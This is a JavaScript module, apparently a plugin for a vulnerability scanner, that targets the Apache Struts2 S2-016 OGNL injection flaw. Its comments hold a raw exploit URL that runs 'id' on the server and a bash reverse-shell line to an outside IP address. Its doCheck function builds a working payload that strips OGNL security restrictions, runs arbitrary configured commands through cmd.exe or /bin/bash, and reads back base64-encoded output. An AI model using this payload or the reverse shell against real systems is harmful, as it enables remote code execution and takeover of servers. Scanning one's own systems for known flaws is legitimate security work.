module.exports={
	tags:"struts2,016",
	"ID":"020104",
	des:"struts2 016漏洞检测",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-016",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-016.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-016"],
/*
/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D
 "action:", "redirect:", "redirectAction:" 
/default.action?redirect:
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
// bash -i >& /dev/tcp/192.168.24.90/4444 0>&1
// s2_016,s2_017
*/
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self,ss;
		var fnT = function(cmd,fnCbk2)
		{
			cmd += "|base64";
			var s = "${#context['xwork.MethodAccessor.denyMethodExecution']=false"
				//////// 增加的关键行 start//////
				+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
				+ ",#f.setAccessible(true)"
				+ ",#f.set(#_memberAccess,true)"
				//////// 增加的关键行 end//////
				+ ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
				+ ',#cmds=(#iswin?{"cmd.exe","/c","' + _s.g_szCmdW + '"}:{"/bin/bash","-c","' + cmd + '"})'
				+ ",#p=new java.lang.ProcessBuilder(#cmds)"
				+ ",#p.redirectErrorStream(true),#process=#p.start()"
				+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
				+ ",#i=#d.read(#e),#as=new java.lang.String(#e,0,#i)" 
				// + ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
				// + ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
				+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
				+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
				//+ ",#as=(@java.net.URLEncoder@encode(#as,'UTF-8'))"
				// + ",#as='{{'+#as+'}}'"
				+ ",#as.toString()"
				+"}";
			var oR = _s.fnOptHeader({method: 'GET',uri: url + "?redirectAction:" + encodeURIComponent(s)
				});
			oR.followAllRedirects = oR.followRedirect=true;
			ss = s;
			_s.request(oR, function(e,r1,b)
		    {
		    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
		    	var re = /and action name \[(.*?)\]/gmi;
		    	re = re.exec(b && b.toString() || "");
		    	if(re)re = _s.Buffer.from(re[1], 'base64').toString();
		    	fnCbk2(re||"");
		    });
	    };
	    var a = _s.g_szCmd.split(";"),aR = [],i = 0;
	    _s.async.mapLimit(a,_s.g_nThread,function(szCmd,fnCbk1)
		{
			fnT(szCmd,function(x)
			{
				aR[a.indexOf(szCmd)] = x;
				i++;
				if(i == a.length)
				{
					// console.log(aR);
					_s.fnDoBody(aR.join(""),"s2-016",url,null,function(o)
			    	{
			    		var r = {"url":url,"send":ss};
		  				fnCbk(_s.copyO2O(r,o),_t);
			    	});
				}
				fnCbk1();
			});
		});
	}
};